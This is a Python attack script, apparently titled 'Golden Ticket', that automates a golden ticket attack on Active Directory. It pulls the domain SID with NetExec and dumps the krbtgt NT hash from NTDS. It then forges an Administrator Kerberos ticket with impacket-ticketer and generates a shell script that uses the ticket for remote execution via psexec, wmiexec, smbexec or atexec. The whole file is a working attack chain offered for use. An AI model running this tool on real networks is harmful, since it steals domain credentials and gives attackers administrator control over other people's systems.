import subprocess
import argparse
from colorama import init, Fore, Style
import textwrap

# Initialize colorama for colored output
init(autoreset=True)

# Define ASCII art with yellow coloring, preserving alignment
ASCII_ART = f"""\
{Fore.YELLOW}
╔═╗╔═╗╦ ╔╦╗╔═╗╔╗╔  ╔╦╗╦╔═╗╦╔═╔═╗╔╦╗
║ ╦║ ║║  ║║║╣ ║║║───║ ║║  ╠╩╗║╣  ║
╚═╝╚═╝╩══╩╝╚═╝╝╚╝   ╩ ╩╚═╝╩ ╩╚═╝ ╩
{Style.RESET_ALL}
"""

# Define helper functions for graphical output
def print_header(title):
    print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 50}")
    print(f"{Fore.CYAN}{Style.BRIGHT}|| {title.center(46)} ||")
    print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 50}")

def print_success(message):
    print(f"{Fore.GREEN}{Style.BRIGHT}[+] {message}")

def print_error(message):
    print(f"{Fore.RED}{Style.BRIGHT}[-] {message}")

def print_info(message):
    print(f"{Fore.YELLOW}{Style.BRIGHT}[*] {message}")

def print_prompt(message):
    return input(f"{Fore.MAGENTA}{Style.BRIGHT}[?] {message}: ")

# Print ASCII art at the start
print(ASCII_ART)

# Set up argument parser
parser = argparse.ArgumentParser(
    description="Extract Domain SID, krbtgt NT hash, generate Kerberos ticket, and create an Impacket shell script",
    formatter_class=argparse.RawTextHelpFormatter
)
parser.add_argument("--ip", required=True, help="Target domain IP address (dc-ip)")
parser.add_argument("--user", required=True, help="Username for authentication")
parser.add_argument("--password", required=True, help="Password for authentication")
parser.add_argument("--domain", required=True, help="Domain name (e.g., domain.local)")

# Parse arguments
args = parser.parse_args()

# Define the LDAP command to get SID
ldap_command = [
    'nxc',
    'ldap',
    args.ip,
    '-u',
    args.user,
    '-p',
    args.password,
    '--get-sid'
]

# Define the SMB command to get NT hash
smb_command = [
    'nxc',
    'smb',
    args.ip,
    '-u',
    args.user,
    '-p',
    args.password,
    '--ntds',
    '--user',
    'krbtgt'
]

try:
    # Run the LDAP command
    print_header("LDAP SID Retrieval")
    print_info("Executing LDAP command to retrieve Domain SID...")
    ldap_result = subprocess.run(ldap_command, capture_output=True, text=True, check=True)
    ldap_output = ldap_result.stdout

    # Initialize variable to store SID
    domain_sid = None

    # Parse the LDAP output to find the Domain SID
    for line in ldap_output.splitlines():
        line = line.strip()
        if 'Domain SID S-1-5-21-' in line:
            # Split the line into tokens
            tokens = line.split()
            # The SID is the token after 'SID'
            if 'Domain' in tokens:
                sid_index = tokens.index('SID') + 1
                if sid_index < len(tokens):
                    domain_sid = tokens[sid_index]

    # Display and store Domain SID
    if domain_sid:
        print_success(f"Domain SID: {domain_sid}")
    else:
        print_error("Domain SID not found in the output.")
        exit(1)

    # Run the SMB command to get NT hash for user krbtgt
    print_header("SMB NT Hash Retrieval")
    print_info("Executing SMB command to retrieve NT hash for krbtgt...")
    smb_result = subprocess.run(smb_command, capture_output=True, text=True, check=True)
    smb_output = smb_result.stdout

    # Parse the SMB output to find the NT hash for krbtgt
    krbtgt_nthash = None
    for line in smb_output.splitlines():
        if 'krbtgt' in line and line.count(':') >= 3:
            parts = line.split(':')
            if len(parts) >= 4:
                krbtgt_nthash = parts[3].strip()
                break

    if krbtgt_nthash:
        print_success(f"NT Hash for krbtgt: {krbtgt_nthash}")
    else:
        print_error("NT Hash not found in the output.")
        exit(1)

    # Define the impacket-ticketer command to generate Kerberos ticket for Administrator
    ticketer_command = [
        'impacket-ticketer',
        '-nthash',
        krbtgt_nthash,
        '-domain-sid',
        domain_sid,
        '-domain',
        args.domain,
        'Administrator'
    ]

    # Run the impacket-ticketer command
    print_header("Kerberos Ticket Generation")
    print_info("Executing impacket-ticketer to generate Kerberos ticket for Administrator...")
    ticketer_result = subprocess.run(ticketer_command, capture_output=True, text=True, check=True)
    ticketer_output = ticketer_result.stdout
    print_success("Kerberos ticket generation output:")
    print(f"{Fore.WHITE}{textwrap.indent(ticketer_output, '  ')}")

    # Run ls -al | grep ccache to confirm ticket file
    print_header("Ticket File Verification")
    print_info("Checking for ccache file...")
    ls_command = "ls -al | grep ccache"
    ls_result = subprocess.run(ls_command, shell=True, capture_output=True, text=True)
    ls_output = ls_result.stdout
    if ls_output.strip():
        print_success("ccache file found:")
        print(f"{Fore.WHITE}{textwrap.indent(ls_output, '  ')}")
    else:
        print_error("No ccache file found in the output.")

    # Prompt user to decide whether to utilize an Impacket tool
    print_header("Impacket Tool Selection")
    while True:
        use_impacket = print_prompt("Do you want to utilize Impacket? [Yes/No]").lower()
        if use_impacket in ['yes', 'no']:
            break
        print_error("Invalid choice. Please enter 'Yes' or 'No'.")

    if use_impacket == 'no':
        print_success("You chose No, exiting the script.")
        exit(0)

    print_success("You chose Yes.")

    # Prompt for device name and target IP
    device = print_prompt("What is the Device").strip()
    if not device:
        print_error("Device name is required")
        exit(1)

    target_ip = print_prompt("What is the Target IP").strip()
    if not target_ip:
        print_error("Target IP is required")
        exit(1)

    # Prompt user to select an Impacket tool
    print_info("Available Impacket tools: psexec, wmiexec, smbexec, atexec")
    while True:
        impacket_tool = print_prompt("Enter the Impacket tool to execute (psexec/wmiexec/smbexec/atexec)").lower()
        if impacket_tool in ['psexec', 'wmiexec', 'smbexec', 'atexec']:
            break
        print_error("Invalid choice. Please choose one of: psexec, wmiexec, smbexec, atexec")

    # Prompt for command if atexec is selected
    command = None
    if impacket_tool == 'atexec':
        command = print_prompt("Enter the command to execute with atexec").strip()
        if not command:
            print_error("A command is required for atexec")
            exit(1)

    # Generate the Impacket command as a string
    full_domain = f"{args.domain}/Administrator@{device}.{args.domain}"
    if impacket_tool == 'psexec':
        impacket_command = f"impacket-psexec -dc-ip {args.ip} -target-ip {target_ip} -no-pass -k {full_domain}"
    elif impacket_tool == 'wmiexec':
        impacket_command = f"impacket-wmiexec -dc-ip {args.ip} -target-ip {target_ip} -no-pass -k {full_domain}"
    elif impacket_tool == 'smbexec':
        impacket_command = f"impacket-smbexec -k -no-pass -dc-ip {args.ip} {device}.{args.domain}"
    elif impacket_tool == 'atexec':
        impacket_command = f"impacket-atexec -k -no-pass -dc-ip {args.ip} {device}.{args.domain} \"{command}\""

    # Write the export and Impacket command to a shell script
    shell_script = "run_impacket.sh"
    with open(shell_script, 'w') as f:
        f.write("#!/bin/bash\n")
        f.write("export KRB5CCNAME=Administrator.ccache\n")
        f.write(f"{impacket_command}\n")

    # Make the shell script executable
    subprocess.run(f"chmod +x {shell_script}", shell=True, check=True)

    # Print the generated shell script content
    print_header("Generated Shell Script")
    print_success(f"Generated shell script ({shell_script}):")
    with open(shell_script, 'r') as f:
        print(f"{Fore.WHITE}{textwrap.indent(f.read(), '  ')}")
    print_success(f"Please run the shell script manually to execute the Impacket command: ./{shell_script}")
    print_success("Exiting Python script.")

except subprocess.CalledProcessError as e:
    print_error(f"Error executing command: {e}")
    print(f"{Fore.RED}Stderr:\n{textwrap.indent(e.stderr, '  ')}")
except Exception as e:
    print_error(f"An unexpected error occurred: {e}")
